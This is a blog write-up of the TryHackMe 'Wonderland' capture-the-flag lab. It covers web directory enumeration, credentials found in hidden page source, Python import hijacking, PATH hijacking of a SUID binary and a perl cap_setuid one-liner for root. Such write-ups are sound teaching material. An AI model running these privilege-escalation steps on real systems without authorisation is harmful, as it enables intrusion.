---
layout: post
title: "THM: Wonderland"
image: ''
date:   2021-10-16 00:00:00
tags:
- beginner
- linux
- python
- tryhackme
- capabilities
description: ''
categories:
published: true
comments: false
---

![intro](https://an00brektn.github.io/img/thm-wonderland/Pasted image 20210908104020.png)

## Intro
Wonderland is probably one of my favorite machines on TryHackMe, not because it's realistic or anything, but because it teaches a lot of concepts if you haven't been exposed to them before, and I also like literature references. I'll start by following a trail of directories on a webpage to get some credentials which I can use to get on the machine. From there, I'll hijack a python program and a bash script to move laterally, and finally abuse linux capabilities to get root.

## Recon
Something, something **nmap**.
```sh
kali@kali:~/ctf/thm/wonderland$ rustscan --ulimit 5000 10.10.239.191 -- -A -oN scans/initscan.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.239.191:22
Open 10.10.239.191:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -oN scans/initscan.txt -vvv -p 22,80 10.10.239.191

[unimportant]

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing out of the ordinary yet, except for the fact that the webpage is presumably written in Golang. Let's take a look at that webpage.

![hello_there](https://an00brektn.github.io/img/thm-wonderland/Pasted image 20210908092549.png)

A whole lot of nothing. I'll feroxbuster without recursion (because it can sometimes blow up a server) and see if I can find anything useful.
```sh
kali@kali:~/ctf/thm/wonderland$ feroxbuster -u http://10.10.239.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html --no-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.239.191
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [txt, html]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        0l        0w        0c http://10.10.239.191/img
301        0l        0w        0c http://10.10.239.191/index.html
301        0l        0w        0c http://10.10.239.191/r
[Didn't finish the scan because it would have taken a while]
```

That `/r` directory is weird. If we navigate to `http://10.10.239.191/r/`, we see this.

![eat_me](https://an00brektn.github.io/img/thm-wonderland/Pasted image 20210908093117.png)

The source code doesn't have comments either. 

## Shell as alice

Let's have another go with feroxbuster and see what happens, and this time, I'll add recursion because it just seems to be static pages (and I shouldn't break the site as easily).

```sh
kali@kali:~/ctf/thm/wonderland$ feroxbuster -u http://10.10.239.191/r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.239.191/r
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [txt, html]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        0l        0w        0c http://10.10.239.191/r/index.html
301        0l        0w        0c http://10.10.239.191/r/a
301        0l        0w        0c http://10.10.239.191/r/a/index.html
301        0l        0w        0c http://10.10.239.191/r/a/b
301        0l        0w        0c http://10.10.239.191/r/a/b/index.html
301        0l        0w        0c http://10.10.239.191/r/a/b/b
301        0l        0w        0c http://10.10.239.191/r/a/b/b/index.html
301        0l        0w        0c http://10.10.239.191/r/a/b/b/i
[stopped early again because time]
```

I think you see where this is going. At `http://10.10.239.191/r/a/b/b/i/t/`, we see this:

![audiojungle](https://an00brektn.github.io/img/thm-wonderland/Pasted image 20210908093658.png)

I went to look at the source code, and I found what are probably credentials.
```html
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothThe************************************</p>
    <img src="/img/thm-wonderland/alice_door.png" style="height: 50rem;">
</body>
```

Let's try signing into SSH.
```sh
kali@kali:~/ctf/thm/wonderland$ ssh alice@10.10.239.191
The authenticity of host '10.10.239.191 (10.10.239.191)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.239.191' (ECDSA) to the list of known hosts.
alice@10.10.239.191's password: 

Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```

I would grab the user flag, but it appears *everything is what it isn't*.
```bash
alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

## Shell as rabbit
Normally, I would default to getting linpeas on here, but since I have a password, it's worth just checking `sudo -l` to see what alice might be able to run as sudo.

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

We can check out what `walrus_and_the_carpenter.py` is.

```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

...[trimmed for brevity]...

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

Usually, python is most easily abused when using a function like `eval()` where you can try and inject commands to spawn a new shell. However, this program is unmodifiable by us, and there isn't any user input. But, we can always check the Python import PATH (not sure what it's actually called but that's what I'm going with).

```bash
alice@wonderland:~$ python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

Since python is checking the current directory first, we can actually do some hijacking. This is something that shows up in a bunch of different forms in CTFs/security (e.g. DLL Hijacking, function hooking), but the general idea is that we replace a dependency/library with one of our own, causing a program to run our code instead of what was intended.

In alice's home directory we can create a new `random.py` file as follows:
```bash
alice@wonderland:~$ echo "import os" > random.py
alice@wonderland:~$ echo "os.system('/bin/bash')" >> random.py
alice@wonderland:~$ cat random.py
import os
os.system('/bin/bash')
```

When the walrus python script decides to `import random`, rather than import from the library that comes with python, it will import our "malicious" script instead. Since we're running with the privileges as rabbit, we'll spawn a shell as that user, instead of a new alice shell.

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

## Shell as hatter
We don't have a password for rabbit, so we're not going to be running anything with sudo anytime soon. Let's check out rabbit's home directory.

```bash
rabbit@wonderland:~$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

The `teaParty` binary is interesting. We see that it has a privilege marked with an `s`, indicating SUID, we could possibly use this to escalate to root. Let's try running it to see what it does.

```bash
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 08 Sep 2021 16:06:22 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

After playing around with this, it seems like the message will always display a time that is a couple hours past the current time. *rude*. How is it getting my time correctly though? I'll have to take this binary offline so I can analyze it, since `strings` doesn't exist on the remote machine. My goto exfiltration method is `pyftpdlib`, but you're free to do what you want.

Normally, I would use `ghidra` for reverse engineering, but I think that's a little overkill. Running strings gives us the following.
```bash
kali@kali:~/ctf/thm/wonderland$ strings teaParty 
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
teaParty.c
...[trimmed for brevity]...
```

At first glance, it doesn't seem like we can do anything with this. However, notice how `echo` is being called with an absolute path, but `date` is being called by its name, which leaves it open for another hijack. If we can stick the rabbit home directory at the beginning of the PATH, and make our own `date` function in the home directory, we can easily get a new shell as a different user (there's a `setuid` command buried in the strings output).

```bash
rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ echo "#!/bin/bash" > date
bash: !/bin/bash: event not found
rabbit@wonderland:/home/rabbit$ echo "#\!/bin/bash" > date
rabbit@wonderland:/home/rabbit$ echo "/bin/bash" >> date
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

## Shell as root
Let's check out hatter's home directory.
```bash
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ ls -la
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
```

Surely there's something good in `password.txt`.
```bash
hatter@wonderland:/home/hatter$ cat password.txt
WhyIs***********************
```

Hmmm. It doesn't seem to be the root password, but it might be hatter's password.
```bash
hatter@wonderland:/home/hatter$ su hatter
Password: 
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
```

At least we're actually signed in as hatter now. After some manual poking around, I decided to run `linpeas.sh`. This result was pretty interesting.
```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
Current: =
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

If we look at the link attached we learn the following.
> Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

`/usr/bin/perl` has the `set_uid` capability, meaning we can just set our UID to root. After reading a little bit more from hacktricks, we can use [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) to find the command that will take us to root

```bash
hatter@wonderland:/tmp$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

I can then grab the user flag (which is in the root directory), and the root flag which we missed from before.

```bash
# cat /root/user.txt
thm{"Cu***********************}
# cat /home/alice/root.txt
thm{Twinkle***************************************************}
```